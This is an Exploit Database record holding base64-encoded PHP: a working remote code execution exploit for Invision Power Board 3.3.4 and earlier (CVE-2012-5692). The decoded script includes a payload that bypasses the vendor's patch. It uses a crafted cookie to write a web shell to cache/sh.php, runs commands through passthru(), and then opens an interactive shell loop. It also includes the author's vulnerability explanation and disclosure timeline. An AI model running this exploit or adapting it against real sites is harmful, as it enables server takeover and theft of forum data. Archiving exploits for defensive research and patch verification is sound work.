{
    "source": "exploit-database", 
    "exploit": "PD9waHANCi8qDQoNClNvIHRoaXMgaXMgdGhlIHBhdGNoIHRoYXQgc2FuaXRpemVzLA0Kc3RhdGljIHB1YmxpYyBmdW5jdGlvbiBzYWZlVW5zZXJpYWxpemUoICRzZXJpYWxpemVkICkNCiAgICB7DQogICAgICAgIC8vIHVuc2VyaWFsaXplIHdpbGwgcmV0dXJuIGZhbHNlIGZvciBvYmplY3QgZGVjbGFyZWQgd2l0aCBzbWFsbCBjYXAgbw0KICAgICAgICAvLyBhcyB3ZWxsIGFzIGlmIHRoZXJlIGlzIGFueSB3cyBiZXR3ZWVuIE8gYW5kIDoNCiAgICAgICAgaWYgKCBpc19zdHJpbmcoICRzZXJpYWxpemVkICkgJiYgc3RycG9zKCAkc2VyaWFsaXplZCwgIlwwIiApID09PSBmYWxzZSApDQogICAgICAgIHsNCiAgICAgICAgICAgIGlmICggc3RycG9zKCAkc2VyaWFsaXplZCwgJ086JyApID09PSBmYWxzZSApDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgLy8gdGhlIGVhc3kgY2FzZSwgbm90aGluZyB0byB3b3JyeSBhYm91dA0KICAgICAgICAgICAgICAgIC8vIGxldCB1bnNlcmlhbGl6ZSBkbyB0aGUgam9iDQogICAgICAgICAgICAgICAgcmV0dXJuIEB1bnNlcmlhbGl6ZSggJHNlcmlhbGl6ZWQgKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGVsc2UgaWYgKCAhIHByZWdfbWF0Y2goJy8oXnw7fHt8fSlPOlswLTldKzoiLycsICRzZXJpYWxpemVkICkgKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIC8vIGluIGNhc2Ugd2UgZGlkIGhhdmUgYSBzdHJpbmcgd2l0aCBPOiBpbiBpdCwNCiAgICAgICAgICAgICAgICAvLyBidXQgaXQgd2FzIG5vdCBhIHRydWUgc2VyaWFsaXplZCBvYmplY3QNCiAgICAgICAgICAgICAgICByZXR1cm4gQHVuc2VyaWFsaXplKCAkc2VyaWFsaXplZCApOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogDQogICAgICAgIHJldHVybiBmYWxzZTsNCiAgICB9DQogICAgDQoNCkFuZCB0aGlzIGlzIHdoYXQgYnlwYXNzZXMgaXQgKCBCeSBAaTBuMWMgKQ0KJHBheWxvYWQgPSB1cmxlbmNvZGUoJ2E6MTp7aTowO086KzE1OiJkYl9kcml2ZXJfbXlzcWwiOjE6e3M6Mzoib2JqIjthOjI6e3M6MTM6InVzZV9kZWJ1Z19sb2ciO2k6MTtzOjk6ImRlYnVnX2xvZyI7czoxMjoiY2FjaGUvc2gucGhwIjt9fX0nKTsNCg0KV2hpY2ggbWFrZXMgdGhpcyBhbiBJUEIgMGRheS4gbHVseiENCg0KLSB3ZWJERVZpTA0KDQoqLw0KDQovKg0KICAgIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiAgICBJbnZpc2lvbiBQb3dlciBCb2FyZCA8PSAzLjMuNCAidW5zZXJpYWxpemUoKSIgUEhQIENvZGUgRXhlY3V0aW9uDQogICAgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KICAgIA0KICAgIGF1dGhvci4uLi4uLi4uLi4uLi4uOiBFZ2lkaW8gUm9tYW5vIGFrYSBFZ2lYDQogICAgbWFpbC4uLi4uLi4uLi4uLi4uLi46IG4wYjBkMTNzW2F0XWdtYWlsW2RvdF1jb20NCiAgICBzb2Z0d2FyZSBsaW5rLi4uLi4uLjogaHR0cDovL3d3dy5pbnZpc2lvbnBvd2VyLmNvbS8NCiAgICANCiAgICArLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSsNCiAgICB8IFRoaXMgcHJvb2Ygb2YgY29uY2VwdCBjb2RlIHdhcyB3cml0dGVuIGZvciBlZHVjYXRpb25hbCBwdXJwb3NlIG9ubHkuICAgIHwNCiAgICB8IFVzZSBpdCBhdCB5b3VyIG93biByaXNrLiBBdXRob3Igd2lsbCBiZSBub3QgcmVzcG9uc2libGUgZm9yIGFueSBkYW1hZ2UuIHwNCiAgICArLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSsNCiAgICANCiAgICBbLV0gVnVsbmVyYWJsZSBjb2RlIGluIElQU0Nvb2tpZTo6Z2V0KCkgbWV0aG9kIGRlZmluZWQgaW4gL2FkbWluL3NvdXJjZXMvYmFzZS9jb3JlLnBocA0KICAgIA0KICAgIDQwMTUuICAgICAgICBzdGF0aWMgcHVibGljIGZ1bmN0aW9uIGdldCgkbmFtZSkNCiAgICA0MDE2LiAgICAgICAgew0KICAgIDQwMTcuICAgICAgICAgICAgLy8gQ2hlY2sgaW50ZXJuYWwgZGF0YSBmaXJzdA0KICAgIDQwMTguICAgICAgICAgICAgaWYgKCBpc3NldCggc2VsZjo6JF9jb29raWVzU2V0WyAkbmFtZSBdICkgKQ0KICAgIDQwMTkuICAgICAgICAgICAgew0KICAgIDQwMjAuICAgICAgICAgICAgICAgIHJldHVybiBzZWxmOjokX2Nvb2tpZXNTZXRbICRuYW1lIF07DQogICAgNDAyMS4gICAgICAgICAgICB9DQogICAgNDAyMi4gICAgICAgICAgICBlbHNlIGlmICggaXNzZXQoICRfQ09PS0lFW2lwc1JlZ2lzdHJ5Ojokc2V0dGluZ3NbJ2Nvb2tpZV9pZCddLiRuYW1lXSApICkNCiAgICA0MDIzLiAgICAgICAgICAgIHsNCiAgICA0MDI0LiAgICAgICAgICAgICAgICAkX3ZhbHVlID0gJF9DT09LSUVbIGlwc1JlZ2lzdHJ5Ojokc2V0dGluZ3NbJ2Nvb2tpZV9pZCddLiRuYW1lIF07DQogICAgNDAyNS4gICAgDQogICAgNDAyNi4gICAgICAgICAgICAgICAgaWYgKCBzdWJzdHIoICRfdmFsdWUsIDAsIDIgKSA9PSAnYTonICkNCiAgICA0MDI3LiAgICAgICAgICAgICAgICB7DQogICAgNDAyOC4gICAgICAgICAgICAgICAgICAgIHJldHVybiB1bnNlcmlhbGl6ZSggc3RyaXBzbGFzaGVzKCB1cmxkZWNvZGUoICRfdmFsdWUgKSApICk7DQogICAgNDAyOS4gICAgICAgICAgICAgICAgfQ0KICAgIA0KICAgIFRoZSB2dWxuZXJhYmlsaXR5IGlzIGNhdXNlZCBkdWUgdG8gdGhpcyBtZXRob2QgdW5zZXJpYWxpemUgdXNlciBpbnB1dCBwYXNzZWQgdGhyb3VnaCBjb29raWVzIHdpdGhvdXQgYSBwcm9wZXINCiAgICBzYW5pdGl6YXRpb24uIFRoZSBvbmx5IG9uZSBjaGVjayBpcyBkb25lIGF0IGxpbmUgNDAyNiwgIHdoZXJlIGlzIGNvbnRyb2xsZWQgdGhhdCB0aGUgc2VyaWFsaXplZCBzdHJpbmcgc3RhcnRzDQogICAgd2l0aCAnYTonLCAgYnV0IHRoaXMgaXMgbm90ICBzdWZmaWNpZW50IHRvIHByZXZlbnQgYSAgIlBIUCBPYmplY3QgSW5qZWN0aW9uIiAgYmVjYXVzZSBhbiBhdHRhY2tlciBtYXkgc2VuZCAgYQ0KICAgIHNlcmlhbGl6ZWQgc3RyaW5nIHdoaWNoIHJlcHJlc2VudHMgYW4gYXJyYXkgb2Ygb2JqZWN0cy4gIFRoaXMgY2FuIGJlICBleHBsb2l0ZWQgdG8gZXhlY3V0ZSBhcmJpdHJhcnkgUEhQIGNvZGUNCiAgICB2aWEgdGhlICAiX19kZXN0cnVjdCgpIiBtZXRob2Qgb2YgdGhlICAiZGJNYWluIiBjbGFzcywgIHdoaWNoIGNhbGxzIHRoZSAid3JpdGVEZWJ1Z0xvZyIgbWV0aG9kIHRvIHdyaXRlIGRlYnVnDQogICAgaW5mbyBpbnRvIGEgZmlsZS4gIFBIUCBjb2RlIG1heSAgYmUgaW5qZWN0ZWQgIG9ubHkgdGhyb3VnaCB0aGUgICRfU0VSVkVSWydRVUVSWV9TVFJJTkcnXSAgdmFyaWFibGUsICBmb3IgdGhpcw0KICAgIHJlYXNvbiBzdWNjZXNzZnVsIGV4cGxvaXRhdGlvbiBvZiB0aGlzIHZ1bG5lcmFiaWxpdHkgcmVxdWlyZXMgc2hvcnRfb3Blbl90YWcgdG8gYmUgZW5hYmxlZC4NCg0KICAgIFstXSBEaXNjbG9zdXJlIHRpbWVsaW5lOg0KICAgIA0KICAgIFsyMS8xMC8yMDEyXSAtIFZ1bG5lcmFiaWxpdHkgZGlzY292ZXJlZA0KICAgIFsyMy8xMC8yMDEyXSAtIFZlbmRvciBub3RpZmllZA0KICAgIFsyNS8xMC8yMDEyXSAtIFBhdGNoIHJlbGVhc2VkOiBodHRwOi8vY29tbXVuaXR5LmludmlzaW9ucG93ZXIuY29tL3RvcGljLzM3MTYyNS1pcGJvYXJkLTMxeC0zMngtYW5kLTMzeC1zZWN1cml0eS11cGRhdGUNCiAgICBbMjUvMTAvMjAxMl0gLSBDVkUgbnVtYmVyIHJlcXVlc3RlZA0KICAgIFsyOS8xMC8yMDEyXSAtIEFzc2lnbmVkIENWRS0yMDEyLTU2OTINCiAgICBbMzEvMTAvMjAxMl0gLSBQdWJsaWMgZGlzY2xvc3VyZQ0KDQoqLw0KDQplcnJvcl9yZXBvcnRpbmcoMCk7DQpzZXRfdGltZV9saW1pdCgwKTsNCmluaV9zZXQoJ2RlZmF1bHRfc29ja2V0X3RpbWVvdXQnLCA1KTsNCg0KZnVuY3Rpb24gaHR0cF9zZW5kKCRob3N0LCAkcGFja2V0KQ0Kew0KICAgIGlmICghKCRzb2NrID0gZnNvY2tvcGVuKCRob3N0LCA4MCkpKSBkaWUoIlxuWy1dIE5vIHJlc3BvbnNlIGZyb20geyRob3N0fTo4MFxuIik7DQogICAgZnB1dHMoJHNvY2ssICRwYWNrZXQpOw0KICAgIHJldHVybiBzdHJlYW1fZ2V0X2NvbnRlbnRzKCRzb2NrKTsNCn0NCg0KcHJpbnQgIlxuKy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tKyI7DQpwcmludCAiXG58IEludmlzaW9uIFBvd2VyIEJvYXJkIDBkYXkgRXhwbG9pdCB8IjsNCnByaW50ICJcbistLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLStcbiI7DQoNCmlmICgkYXJnYyA8IDMpDQp7DQogICAgcHJpbnQgIlxuVXNhZ2UuLi4uLi46IHBocCAkYXJndlswXSA8aG9zdD4gPHBhdGg+XG4iOw0KICAgIHByaW50ICJcbkV4YW1wbGUuLi4uOiBwaHAgJGFyZ3ZbMF0gbG9jYWxob3N0IC8iOw0KICAgIHByaW50ICJcbkV4YW1wbGUuLi4uOiBwaHAgJGFyZ3ZbMF0gbG9jYWxob3N0IC9pcGIvXG4iOw0KICAgIGRpZSgpOw0KfQ0KDQpsaXN0KCRob3N0LCAkcGF0aCkgPSBhcnJheSgkYXJndlsxXSwgJGFyZ3ZbMl0pOw0KDQokcGFja2V0ICA9ICJHRVQgeyRwYXRofWluZGV4LnBocCBIVFRQLzEuMFxyXG4iOw0KJHBhY2tldCAuPSAiSG9zdDogeyRob3N0fVxyXG4iOw0KJHBhY2tldCAuPSAiQ29ubmVjdGlvbjogY2xvc2VcclxuXHJcbiI7DQogICAgDQokX3ByZWZpeCA9IHByZWdfbWF0Y2goJy9Db29raWU6ICguKylzZXNzaW9uLycsIGh0dHBfc2VuZCgkaG9zdCwgJHBhY2tldCksICRtKSA/ICAkbVsxXSA6ICcnOw0KDQpjbGFzcyBkYl9kcml2ZXJfbXlzcWwNCnsNCiAgICBwdWJsaWMgJG9iaiA9IGFycmF5KCd1c2VfZGVidWdfbG9nJyA9PiAxLCAnZGVidWdfbG9nJyA9PiAnY2FjaGUvc2gucGhwJyk7DQp9DQojIFN1cGVyIGJ5cGFzcyBieSBAaTBuMWMNCiRwYXlsb2FkID0gdXJsZW5jb2RlKCdhOjE6e2k6MDtPOisxNToiZGJfZHJpdmVyX215c3FsIjoxOntzOjM6Im9iaiI7YToyOntzOjEzOiJ1c2VfZGVidWdfbG9nIjtpOjE7czo5OiJkZWJ1Z19sb2ciO3M6MTI6ImNhY2hlL3NoLnBocCI7fX19Jyk7DQokcGhwY29kZSA9ICc8P2Vycm9yX3JlcG9ydGluZygwKTtwcmludChfX18pO3Bhc3N0aHJ1KGJhc2U2NF9kZWNvZGUoJF9TRVJWRVJbSFRUUF9DTURdKSk7ZGllOz8+JzsNCg0KJHBhY2tldCAgPSAiR0VUIHskcGF0aH1pbmRleC5waHA/eyRwaHBjb2RlfSBIVFRQLzEuMFxyXG4iOw0KJHBhY2tldCAuPSAiSG9zdDogeyRob3N0fVxyXG4iOw0KJHBhY2tldCAuPSAiQ29va2llOiB7JF9wcmVmaXh9bWVtYmVyX2lkPXskcGF5bG9hZH1cclxuIjsNCiRwYWNrZXQgLj0gIkNvbm5lY3Rpb246IGNsb3NlXHJcblxyXG4iOw0KDQpodHRwX3NlbmQoJGhvc3QsICRwYWNrZXQpOw0KDQokcGFja2V0ICA9ICJHRVQgeyRwYXRofWNhY2hlL3NoLnBocCBIVFRQLzEuMFxyXG4iOw0KJHBhY2tldCAuPSAiSG9zdDogeyRob3N0fVxyXG4iOw0KJHBhY2tldCAuPSAiQ21kOiAlc1xyXG4iOw0KJHBhY2tldCAuPSAiQ29ubmVjdGlvbjogY2xvc2VcclxuXHJcbiI7DQoNCmlmIChwcmVnX21hdGNoKCcvPFw/ZXJyb3IvJywgaHR0cF9zZW5kKCRob3N0LCAkcGFja2V0KSkpIGRpZSgiXG5bLV0gc2hvcnRfb3Blbl90YWcgZGlzYWJsZWQhXG4iKTsNCg0Kd2hpbGUoMSkNCnsNCiAgICBwcmludCAiXG5pcGItc2hlbGwjICI7DQogICAgaWYgKCgkY21kID0gdHJpbShmZ2V0cyhTVERJTikpKSA9PSAiZXhpdCIpIGJyZWFrOw0KICAgICRyZXNwb25zZSA9IGh0dHBfc2VuZCgkaG9zdCwgc3ByaW50ZigkcGFja2V0LCBiYXNlNjRfZW5jb2RlKCRjbWQpKSk7DQogICAgcHJlZ19tYXRjaCgnL19fXyguKikvcycsICRyZXNwb25zZSwgJG0pID8gcHJpbnQgJG1bMV0gOiBkaWUoIlxuWy1dIEV4cGxvaXQgZmFpbGVkIVxuIik7DQp9DQo/Pg==", 
    "filename": "platforms/php/webapps/22547.php", 
    "id": "22547", 
    "cves": [
        "CVE-2012-5692"
    ]
}